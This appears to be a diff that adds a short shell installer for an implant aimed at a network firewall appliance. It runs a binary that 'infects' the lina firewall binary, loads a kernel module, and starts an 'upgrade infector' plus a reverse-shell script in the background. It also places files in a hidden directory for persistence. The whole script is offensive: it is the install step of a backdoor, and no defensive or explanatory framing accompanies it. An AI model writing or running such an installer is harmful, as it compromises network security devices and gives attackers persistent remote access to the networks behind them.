@@ -1,0 +1,11 @@
+#!/bin/sh
+if [ ! -d /mnt/disk0/.private/.cache/ ]; then
+  mkdir /mnt/disk0/.private/.cache/
+fi
+/root/M4R10-infect-lina /asa/bin/lina
+echo "[*] Installing M4R10-open LKM !"
+insmod /root/M4R10-open.ko
+echo "[*] Starting the upgrade infector as a background process"
+/root/M4R10-upgrade&
+/root/M4R10-reverse.sh&
+cp /root/M4R10.cfg /mnt/disk0/M4R10.cfg
